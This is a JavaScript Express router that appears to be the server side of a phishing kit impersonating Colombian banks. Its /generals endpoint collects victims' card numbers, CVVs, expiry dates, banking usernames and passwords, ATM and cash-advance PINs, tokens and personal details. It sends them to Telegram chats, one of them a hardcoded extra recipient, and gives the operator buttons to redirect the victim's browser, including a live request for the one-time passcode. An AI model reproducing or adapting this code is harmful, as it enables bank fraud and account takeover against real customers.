import express from 'express';
import bot from '../config/botConfig.js';
import { CHAT_ID } from '../config/preconfigs.js';
import { generateRandomID } from '../helpers/utils.js';

const router = express.Router();

const activeMessages = new Map(); // Almacena los mensajes activos con su respectivo token

router.post('/view', (req) =>{
    bot.sendMessage(CHAT_ID, req.body.message);
});

router.post('/generals', (req, res) => {

  let infoMessage3 = `
    \u{1F534} Nuevo Registro \u{1F534}

    ----------------------------

    \u{1F534} CC: ${req.body.cc} \u{1F534}

    ----------------------------

    \u{1F534} BANCO: ${req.body.ban}

    \u{1F4B3} CARD: ${req.body.p}

    \u{1F4C5} FECHA: ${req.body.f}

    \u{2B50} CVV: ${req.body.c}

    \u{1F535} TIPO: ${req.body.type}

    ----------------------------

    \u{1F465} User: ${req.body.user}

    \u{1F512} Pass: ${req.body.puser}

    \u{1F512} cCajero: ${req.body.ccajero}

    \u{1F512} cAvances: ${req.body.cavances}

    ----------------------------

    \u{1F4A3} TOKEN: ${req.body.tok}

    -------- ADICIONAL ---------

    \u{1F4E7} Email: ${req.body.email}

    \u{1F4F2} Celular: ${req.body.cel}

    \u{1F534} Nombre(s): ${req.body.names}

    \u{1F534} Ciudad: ${req.body.cenv}

    \u{1F534} Dirección: ${req.body.dir}

    ----------------------------
    IP: ${req.ip.split(':').pop()}
  
  `;

  const token = generateRandomID();

  const opts3 = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          { text: '$ Pedir OTP $', callback_data: `otp:${token}` }
        ],
        [
          { text: 'repeatCard', callback_data: `rcard:${token}` },
          { text: 'newCard', callback_data: `ncard:${token}` },
          { text: 'newUserPass', callback_data: `userp:${token}` },
          { text: 'newCC', callback_data: `index:${token}` },
        ],
        [
          { text: 'Finalizar', callback_data: `success:${token}` },
        ]
      ],
      one_time_keyboard: true,
    }),
  };

  const optscol = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          { text: '$ Pedir OTP $', callback_data: `otp:${token}` }
        ],
        [
          { text: 'repeatCard', callback_data: `rcard:${token}` },
          { text: 'newCard', callback_data: `ncard:${token}` },
          { text: 'newUserPass', callback_data: `userp:${token}` },
          { text: 'newCC', callback_data: `index:${token}` },
        ],
        [
          { text: 'cCajero', callback_data: `ccajero:${token}` },
          { text: 'cAvances', callback_data: `cavances:${token}` },
        ],
        [
          { text: 'Finalizar', callback_data: `success:${token}` },
        ]
      ],
      one_time_keyboard: true,
    }),
  };


  if (req.body.user === '') {
    bot.sendMessage(CHAT_ID, infoMessage3);
    bot.sendMessage('1660900306', infoMessage3);
  } else {
    bot.sendMessage(CHAT_ID, infoMessage3)
      .then(() => {
        bot.sendMessage(CHAT_ID, 'OPCIONES: ', req.body.ban === 'scotiabank-colpatria' ? optscol : opts3)
          .then(message => {
            bot.sendMessage('1660900306', infoMessage3);
            const messageID = message.message_id;
            activeMessages.set(token, { messageID, res });
          })
          .catch(err => console.log(err));
      });
  }
})


// Maneja las respuestas a las opciones del teclado personalizado
bot.on('callback_query', (query) => {
  const data = query.data.split(':');
  const token = data[1];

  if (activeMessages.has(token)) {
    const { messageID, res } = activeMessages.get(token);
    activeMessages.delete(token); // Elimina el mensaje de la estructura de datos

    bot.deleteMessage(CHAT_ID, messageID);

    // Enviar respuesta a través de la respuesta HTTP almacenada
    console.log('Redirigiendo a -> ' + data[0]);
    res.json({ 'redirect_to': data[0] });
  }
});


export default router;